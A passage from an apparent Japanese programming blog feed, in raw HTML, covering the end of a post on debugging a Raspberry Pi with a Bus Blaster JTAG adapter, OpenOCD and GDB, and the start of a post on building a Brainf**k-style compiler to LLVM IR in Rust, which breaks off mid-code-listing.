<span id="cb8-20"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-20" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-21"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-21" aria-hidden="true" tabindex="-1"></a><span class="kw">if</span> <span class="kw">{</span> <span class="kw">[info</span> <span class="ot">exists</span> CPU_TAPID <span class="kw">]</span> <span class="kw">}</span> <span class="kw">{</span></span>
<span id="cb8-22"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-22" aria-hidden="true" tabindex="-1"></a>   <span class="kw">set</span> _CPU_TAPID <span class="dt">$CPU_TAPID</span></span>
<span id="cb8-23"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-23" aria-hidden="true" tabindex="-1"></a><span class="kw">}</span> <span class="kw">else</span> <span class="kw">{</span></span>
<span id="cb8-24"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-24" aria-hidden="true" tabindex="-1"></a>   <span class="kw">set</span> _CPU_TAPID <span class="dv">0x07b7617F</span></span>
<span id="cb8-25"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-25" aria-hidden="true" tabindex="-1"></a><span class="kw">}</span></span>
<span id="cb8-26"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-26" aria-hidden="true" tabindex="-1"></a>jtag newtap <span class="dt">$_CHIPNAME</span> arm<span class="ot"> -irlen</span> <span class="dv">5</span><span class="ot"> -expected</span>-<span class="ot">id</span> <span class="dt">$_CPU_TAPID</span></span>
<span id="cb8-27"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-27" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-28"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-28" aria-hidden="true" tabindex="-1"></a><span class="kw">set</span> _TARGETNAME <span class="dt">$_CHIPNAME</span>.arm</span>
<span id="cb8-29"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-29" aria-hidden="true" tabindex="-1"></a>target <span class="ot">create</span> <span class="dt">$_TARGETNAME</span> arm11<span class="ot"> -chain</span>-position <span class="dt">$_TARGETNAME</span></span>
<span id="cb8-30"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-30" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-31"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-31" aria-hidden="true" tabindex="-1"></a>arm11 memwrite burst disable</span></code></pre></div>
<p><code>interface/ftdi/dp_busblaster.cfg</code> および修正した <code>raspi.cfg</code> を OpenOCD 起動時に渡してやり、こんな感じのメッセージが出たら成功です。</p>
<pre><code>$ openocd -f interface/ftdi/dp_busblaster.cfg -f raspi.cfg
Open On-Chip Debugger 0.10.0
Licensed under GNU GPL v2
For bug reports, read
	http://openocd.org/doc/doxygen/bugs.html
Info : If you need SWD support, flash KT-Link buffer from https://github.com/bharrisau/busblaster
and use dp_busblaster_kt-link.cfg instead
adapter speed: 1000 kHz
none separate
Info : auto-selecting first available session transport &quot;jtag&quot;. To override use 'transport select &lt;transport&gt;'.
Info : memory write burst mode is disabled
Info : clock speed 1000 kHz
Info : JTAG tap: raspi.arm tap/device found: 0x07b7617f (mfg: 0x0bf (Broadcom), part: 0x7b76, ver: 0x0)
Info : found ARM1176
Info : raspi.arm: hardware has 6 breakpoints, 2 watchpoints</code></pre>
<p>OpenOCD が起動すると、GDB server が 3333 ポートで 立ち上がります。これに GDB から <code>target remote localhost:3333</code> で接続すればデバッグの準備は完了です。下の実行例で渡している <code>-q</code> オプションは GDB 起動時に表示されるバージョン等を非表示にするもので、<code>blink.elf</code> が今回デバッグしようとしているプログラムです。</p>
<pre><code>$ arm-none-eabi-gdb -q blink.elf
Reading symbols from blink.elf...
(gdb) target remote localhost:3333
Remote debugging using localhost:3333
main () at main.cc:21
21	  for (;;)
(gdb)</code></pre>
<p>たまに <code>target ...</code> で接続したあとプログラムカウンタが正しく表示されないことがあります。そのときは一旦 <code>continue</code> (またはその省略形 <code>c</code>) で実行を再開させたあと Ctrl-C で中断すればなおるようです。</p>
<pre><code>(gdb) target remote localhost:3333
Remote debugging using localhost:3333
0x00000000 in ?? ()
(gdb) c
Continuing.
WARNING! The target is already running. All changes GDB did to registers will be discarded! Waiting for target to halt.
^C
Program received signal SIGINT, Interrupt.
main () at main.cc:21
21	  for (;;)
(gdb)</code></pre>
<p>あとはだいたいいつも通りの GDB の操作ができるほか、<code>load</code> コマンドでプログラムを再転送できたりします。</p>
<pre><code>(gdb) load
Loading section .text, size 0x69228 lma 0x8000
Loading section .rodata, size 0x763c lma 0x71228
Loading section .ARM.extab, size 0x4b70 lma 0x78864
Loading section .ARM.exidx, size 0x3500 lma 0x7d3d4
Loading section .init_array, size 0x1c lma 0x808d4
Loading section .fini_array, size 0x4 lma 0x808f0
Loading section .data, size 0xab0 lma 0x808f8
Start address 0x00008000, load size 496548
Transfer rate: 30 KB/sec, 14187 bytes/write.
(gdb) </code></pre>
<h2 id="おわり">おわり</h2>
<p>JTAG デバッガ Bus Blaster v3 を使って Raspberry Pi Model B をデバッグしてみる例を紹介しました。マイコンの解析やデバッグがとても便利になるツールが比較的安価で手に入るのはよいですね。</p>
<p>今回 JTAG デバッガが欲しくなったのは、JTAG を使ったデバッグはあまりやったことがなく試してみたくなった<a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>のと、いろいろあって Raspberry Pi のベアメタルアプリケーションを書いていてどうしてもわからなかったバグ<a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a>を調べたかったのが理由です。せっかく興味を持って取り組んでいたジャンルなので、これをきっかけにもっと突き詰めてみたいですし、いずれは謎デバイスの解析とかもやってみたいなと思います。</p>
<h2 id="関連リンク">関連リンク</h2>
<ul>
<li><a href="https://tatsu-zine.com/books/raspi-bm">BareMetalで遊ぶ　Raspberry Pi - 達人出版会</a></li>
<li><a href="https://www.raspberrypi.org/documentation/hardware/raspberrypi/bcm2835/README.md">BCM2835 - Raspberry Pi Documentation</a>
<ul>
<li><a href="https://www.raspberrypi.org/documentation/hardware/raspberrypi/bcm2835/BCM2835-ARM-Peripherals.pdf">BCM2835 ARM Peripherals</a></li>
</ul></li>
<li><a href="https://elinux.org/RPi_Low-level_peripherals">RPi Low-level peripherals - eLinux.org</a></li>
<li><a href="http://openocd.org/doc/html/index.html">OpenOCD User’s Guide: Top</a></li>
</ul>
<section class="footnotes footnotes-end-of-document" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p>“It works on all models of Raspberry Pi.” とは… これ <a href="https://github.com/raspberrypi/firmware">raspberrypi/firmware</a> とかに報告したら解決したりするかなぁ<a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p>FPGA を触っていたときビットストリームやプログラムの転送にはよく使っていたけど、デバッグはあまりやらなかった<a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn3" role="doc-endnote"><p><code>float</code> や <code>double</code> の値を <code>printf</code> などで表示しようとするとその値がおかしいというもの。<a href="https://sourceware.org/legacy-ml/crossgcc/2010-10/msg00147.html">これ</a> とおそらく同じもので、スタックポインタの初期値が悪く ARM EABI の<a href="https://wiki.debian.org/ArmEabiPort#Stack_alignment">関数呼び出し時のスタックポインタが 8 byte でアラインされていること</a>というルールが守れていなかったのが原因だった<a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn4" role="doc-endnote"><p>ちなみにこのバグは Bus Blaster を発注したあとすぐに原因がわかってしまったというオチがあります<a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#fnref4" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>]]></summary>
</entry>
<entry>
    <title>Brainf**k からはじめる自作コンパイラ</title>
    <link href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/index.html" />
    <id>https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/index.html</id>
    <published>2019-10-21T14:54:58Z</published>
    <updated>2019-10-21T14:54:58Z</updated>
    <summary type="html"><![CDATA[<p>コンパイラやインタプリタは、プログラミングをするときほぼ必ず使うことになる重要なソフトウェアです。その原理ついては大学の講義で学んだことのある人も多いのではないでしょうか。</p>
<p>とはいえ、原理を学んだところでそれがシュッと実装できるかはコンパイラに限らずそうではない場合が多いと思います。僕もその1人でした。コンパイラの講義や Haskell でパーサコンビネータを実装した流れからコンパイラの実装に興味を持ったものの、どの程度の機能をどう実装するかに悩んでなかなか進まず、結局ほかにもやりたいことがあるからと有耶無耶になってしまった経験があったりします。</p>
<p>最近ふと「そういえば <a href="https://en.wikipedia.org/wiki/Brainfuck">Brainf**k</a> の処理系って書いたことなかったな」と思い、以前読んで気になっていた <a href="https://itchyny.hatenablog.com/entry/2017/02/27/100000">itchyny さんのブログ記事</a>を参考にしながら Brainf**k を LLVM IR にするコンパイラのようなものを実装してみたことがありました。</p>
<blockquote class="twitter-tweet tw-align-center">
<p lang="ja" dir="ltr">
Brainf**k の処理系って未だに書いたことないなーってことで、インタプリタと LLVM IR を出力するコンパイラみたいなの書いてた <a href="https://t.co/FlSdpxU3yX">https://t.co/FlSdpxU3yX</a>
</p>
— +。:.ﾟ٩(๑＞◡＜๑)۶:.｡+ﾟ (@myon___) <a href="https://twitter.com/myon___/status/1167413225211625472?ref_src=twsrc%5Etfw">August 30, 2019</a>
</blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
<p>これが数時間もしないうちに実装できてしまったことにまず驚きます。そして Brainf**k コンパイラの実装を眺めていると、コンパイラを構成する要素でいうところのコード生成に相当するものではないかということに気づき更に衝撃を受けます。ただ Brainf**k の処理系を書いていたつもりが、いつの間にかコンパイラの一部を、しかも比較的短時間で実装していたのです。</p>
<p>僕はプログラミングを完全に理解しているわけではないので、何かしらの処理をプログラムするときに、まずどのような感じになるかをイメージしやすくするための最小限の実装から始めることがよくあります<a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>。コンパイラもそうすればよかったのです。小さなプログラミング言語？ Brainf**k だ！Brainf**k レベルに機能を制限しつつも見慣れた構文を持つプログラミング言語 (<a href="https://github.com/masarakki/nyaruko_lang">これ</a> みたいな Brainf**k の命令を別の文字列に置換しただけの言語ではない) を設計し、それを認識する字句解析や構文解析などを実装していけば、とりあえずコンパイラを構成する要素を一通り実装できるのではないか。そんなモチベーションで始めた自作コンパイラ <a href="https://github.com/Tosainu/chiya">chiya</a> をどのように実装したかの紹介をしていきます。</p>
<!--more-->
<h2 id="準備">準備</h2>
<p>chiya は <a href="https://www.rust-lang.org/">Rust</a> で実装しました。記事執筆時点でのツールチェインのバージョンは次のとおりです。</p>
<pre><code>$ rustup --version
rustup 1.20.2 (2019-10-16)

$ rustup show active-toolchain
stable-x86_64-unknown-linux-gnu (default)

$ rustc --version
rustc 1.38.0 (625451e37 2019-09-23)

$ clang --version
clang version 9.0.0 (tags/RELEASE_900/final)
Target: x86_64-pc-linux-gnu
Thread model: posix
InstalledDir: /usr/bin</code></pre>
<p>プロジェクト<a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>は以下のように作成し、ライブラリと実行ファイルを含むようにしてみました。</p>
<pre><code>$ cargo new --lib chiya

$ mkdir -p src/bin
$ cat &gt; src/bin/chiya.rs &lt;&lt;EOS
fn main() {
    println!(&quot;Hello, World!&quot;);
}
EOS

$ cargo run
   Compiling chiya v0.1.0 (/path/to/work/dir/chiya)
    Finished dev [unoptimized + debuginfo] target(s) in 1.45s
     Running `target/debug/chiya`
Hello, World!</code></pre>
<h2 id="brainfk-レベルのコード生成を実装する">Brainf**k レベルのコード生成を実装する</h2>
<p>まずは本記事のきっかけともいえる、 Brainf**k の各命令に対応する LLVM assembly language (LLVM IR<a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a>) を生成する処理から実装します。最初にこんな感じの <code>trait</code> を <a href="https://github.com/Tosainu/chiya/blob/c8a26f5cebf89fa41edde83e23873a4837a55d3f/src/codegen/emitter.rs"><code>src/codegen/emitter.rs</code></a> に実装しました。</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb3-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="kw">pub</span> <span class="kw">trait</span> Emitter <span class="op">{</span></span>
<span id="cb3-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-2" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ptr を offset 進める</span></span>
<span id="cb3-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">fn</span> emit_move_ptr(<span class="op">&amp;</span><span class="kw">mut</span> <span class="kw">self</span><span class="op">,</span> offset<span class="op">:</span> <span class="dt">i32</span>) <span class="op">-&gt;</span> <span class="dt">String</span><span class="op">;</span></span>
<span id="cb3-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-5" aria-hidden="true" tabindex="-1"></a>    <span class="co">// *ptr に n 加算する</span></span>
<span id="cb3-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">fn</span> emit_add(<span class="op">&amp;</span><span class="kw">mut</span> <span class="kw">self</span><span class="op">,</span> n<span class="op">:</span> <span class="dt">i32</span>) <span class="op">-&gt;</span> <span class="dt">String</span><span class="op">;</span></span>
<span id="cb3-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-8" aria-hidden="true" tabindex="-1"></a>    <span class="co">// putchar() を呼ぶ</span></span>
<span id="cb3-9"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">fn</span> emit_call_putchar(<span class="op">&amp;</span><span class="kw">mut</span> <span class="kw">self</span>) <span class="op">-&gt;</span> <span class="dt">String</span><span class="op">;</span></span>
<span id="cb3-10"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-11"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-11" aria-hidden="true" tabindex="-1"></a>    <span class="co">// getchar() を呼ぶ</span></span>
<span id="cb3-12"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-12" aria-hidden="true" tabindex="-1"></a>    <span class="kw">fn</span> emit_call_getchar(<span class="op">&amp;</span><span class="kw">mut</span> <span class="kw">self</span>) <span class="op">-&gt;</span> <span class="dt">String</span><span class="op">;</span></span>
<span id="cb3-13"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-14"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-14" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ループのはじまり</span></span>
<span id="cb3-15"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-15" aria-hidden="true" tabindex="-1"></a>    <span class="kw">fn</span> emit_loop_begin(<span class="op">&amp;</span><span class="kw">mut</span> <span class="kw">self</span>) <span class="op">-&gt;</span> <span class="dt">String</span><span class="op">;</span></span>
<span id="cb3-16"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-17"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-17" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ループのおわり</span></span>
<span id="cb3-18"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-18" aria-hidden="true" tabindex="-1"></a>    <span class="kw">fn</span> emit_loop_end(<span class="op">&amp;</span><span class="kw">mut</span> <span class="kw">self</span>) <span class="op">-&gt;</span> <span class="dt">String</span><span class="op">;</span></span>
<span id="cb3-19"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-20"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-20" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 生成するコードのヘッダ</span></span>
<span id="cb3-21"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-21" aria-hidden="true" tabindex="-1"></a>    <span class="kw">fn</span> emit_header(<span class="op">&amp;</span><span class="kw">self</span>) <span class="op">-&gt;</span> <span class="dt">String</span><span class="op">;</span></span>
<span id="cb3-22"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-22" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-23"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-23" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 生成するコードのフッタ</span></span>
<span id="cb3-24"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-24" aria-hidden="true" tabindex="-1"></a>    <span class="kw">fn</span> emit_footer(<span class="op">&amp;</span><span class="kw">self</span>) <span class="op">-&gt;</span> <span class="dt">String</span><span class="op">;</span></span>
<span id="cb3-25"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb3-25" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>続いて <a href="https://github.com/Tosainu/chiya/blob/0142dec5700759efb7b50ee1284fe42e81add906/src/codegen/llvm.rs"><code>src/codegen/llvm.rs</code></a> にこんな感じのデータ型 <code>LLVM</code> を定義しました。各フィールドは与えたソースコード全体のコードを生成するにあたって必要となる情報で、<code>variable_idx</code> は次に登場する無名変数のインデックス (LLVM IR で計算の途中結果などを格納する変数 (<a href="http://releases.llvm.org/9.0.0/docs/LangRef.html#identifiers">Unnamed values</a>) は <code>%1</code>, <code>%2</code> … と<a href="http://releases.llvm.org/9.0.0/docs/LangRef.html#functions">登場する順に1からカウントしていく必要がある</a>)、<code>label_idx</code> はループで使われるラベルのインデックス、<code>loop_stack</code> は今どのループの中にいるかを管理するためのものです。このデータ型に先程定義した <code>Emitter</code> のメソッドを生やしていきます。</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb4-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">use</span> <span class="pp">std::collections::</span>VecDeque<span class="op">;</span></span>
<span id="cb4-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb4-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="kw">pub</span> <span class="kw">struct</span> LLVM <span class="op">{</span></span>
<span id="cb4-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb4-4" aria-hidden="true" tabindex="-1"></a>    variable_idx<span class="op">:</span> <span class="dt">u32</span><span class="op">,</span></span>
<span id="cb4-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb4-5" aria-hidden="true" tabindex="-1"></a>    label_idx<span class="op">:</span> <span class="dt">u32</span><span class="op">,</span></span>
<span id="cb4-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb4-6" aria-hidden="true" tabindex="-1"></a>    loop_stack<span class="op">:</span> VecDeque<span class="op">&lt;</span><span class="dt">u32</span><span class="op">&gt;,</span></span>
<span id="cb4-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb4-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb4-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-9"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb4-9" aria-hidden="true" tabindex="-1"></a><span class="kw">impl</span> LLVM <span class="op">{</span></span>
<span id="cb4-10"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb4-10" aria-hidden="true" tabindex="-1"></a>    <span class="kw">pub</span> <span class="kw">fn</span> new() <span class="op">-&gt;</span> LLVM <span class="op">{</span></span>
<span id="cb4-11"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb4-11" aria-hidden="true" tabindex="-1"></a>        <span class="bu">Default</span><span class="pp">::</span><span class="kw">default</span>()</span>
<span id="cb4-12"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb4-12" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb4-13"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb4-13" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb4-14"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb4-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-15"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb4-15" aria-hidden="true" tabindex="-1"></a><span class="kw">impl</span> <span class="bu">Default</span> <span class="cf">for</span> LLVM <span class="op">{</span></span>
<span id="cb4-16"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb4-16" aria-hidden="true" tabindex="-1"></a>    <span class="kw">fn</span> default() <span class="op">-&gt;</span> <span class="dt">Self</span> <span class="op">{</span></span>
<span id="cb4-17"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb4-17" aria-hidden="true" tabindex="-1"></a>        LLVM <span class="op">{</span></span>
<span id="cb4-18"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb4-18" aria-hidden="true" tabindex="-1"></a>            variable_idx<span class="op">:</span> <span class="dv">1</span><span class="op">,</span></span>
<span id="cb4-19"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb4-19" aria-hidden="true" tabindex="-1"></a>            label_idx<span class="op">:</span> <span class="dv">1</span><span class="op">,</span></span>
<span id="cb4-20"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb4-20" aria-hidden="true" tabindex="-1"></a>            loop_stack<span class="op">:</span> <span class="pp">VecDeque::</span>new()<span class="op">,</span></span>
<span id="cb4-21"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb4-21" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
<span id="cb4-22"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb4-22" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb4-23"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb4-23" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>上で紹介した itchyny さんのブログ記事などと同様に、目的の動作を C で書いて、それがどのような LLVM IR になるかを <code>clang</code> で確認しながら実装していく方針で進めました。例えば次のポインタ <code>ptr</code> の加算と <code>ptr</code> が指す値への加算をする処理は</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb5-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">()</span> <span class="op">{</span></span>
<span id="cb5-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb5-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span><span class="op">*</span> ptr<span class="op">;</span></span>
<span id="cb5-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb5-3" aria-hidden="true" tabindex="-1"></a>  <span class="op">++</span>ptr<span class="op">;</span></span>
<span id="cb5-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb5-4" aria-hidden="true" tabindex="-1"></a>  <span class="op">++*</span>ptr<span class="op">;</span></span>
<span id="cb5-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p><code>clang -O0 -S --emit-llvm</code> の出力によればこんな感じの LLVM IR になるようなので</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode llvm"><code class="sourceCode llvm"><span id="cb6-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co">; ModuleID = 'test.c'</span></span>
<span id="cb6-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-2" aria-hidden="true" tabindex="-1"></a>source_filename = <span class="st">&quot;test.c&quot;</span></span>
<span id="cb6-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="kw">target</span> <span class="kw">datalayout</span> = <span class="st">&quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;</span></span>
<span id="cb6-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="kw">target</span> <span class="kw">triple</span> = <span class="st">&quot;x86_64-pc-linux-gnu&quot;</span></span>
<span id="cb6-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-6" aria-hidden="true" tabindex="-1"></a><span class="co">; Function Attrs: noinline nounwind optnone sspstrong uwtable</span></span>
<span id="cb6-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="kw">define</span> dso_local <span class="dt">i32</span> <span class="fu">@main</span>() #<span class="dv">0</span> {</span>
<span id="cb6-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-8" aria-hidden="true" tabindex="-1"></a>  <span class="fu">%1</span> = <span class="kw">alloca</span> <span class="dt">i32</span>*, <span class="kw">align</span> <span class="dv">8</span></span>
<span id="cb6-9"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-9" aria-hidden="true" tabindex="-1"></a>  <span class="fu">%2</span> = <span class="kw">load</span> <span class="dt">i32</span>*, <span class="dt">i32</span>** <span class="fu">%1</span>, <span class="kw">align</span> <span class="dv">8</span></span>
<span id="cb6-10"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-10" aria-hidden="true" tabindex="-1"></a>  <span class="fu">%3</span> = <span class="kw">getelementptr</span> <span class="kw">inbounds</span> <span class="dt">i32</span>, <span class="dt">i32</span>* <span class="fu">%2</span>, <span class="dt">i32</span> <span class="dv">1</span></span>
<span id="cb6-11"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-11" aria-hidden="true" tabindex="-1"></a>  <span class="kw">store</span> <span class="dt">i32</span>* <span class="fu">%3</span>, <span class="dt">i32</span>** <span class="fu">%1</span>, <span class="kw">align</span> <span class="dv">8</span></span>
<span id="cb6-12"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-12" aria-hidden="true" tabindex="-1"></a>  <span class="fu">%4</span> = <span class="kw">load</span> <span class="dt">i32</span>*, <span class="dt">i32</span>** <span class="fu">%1</span>, <span class="kw">align</span> <span class="dv">8</span></span>
<span id="cb6-13"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-13" aria-hidden="true" tabindex="-1"></a>  <span class="fu">%5</span> = <span class="kw">load</span> <span class="dt">i32</span>, <span class="dt">i32</span>* <span class="fu">%4</span>, <span class="kw">align</span> <span class="dv">4</span></span>
<span id="cb6-14"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb6-14" aria-hidden="true" tabindex="-1"></a>  <span class="fu">%6</span> = <span class="kw">add</span> <span class="kw">nsw</span> <span class="dt">i32</span> <span class="fu">%5</span>, <span class="dv">1</span></span>
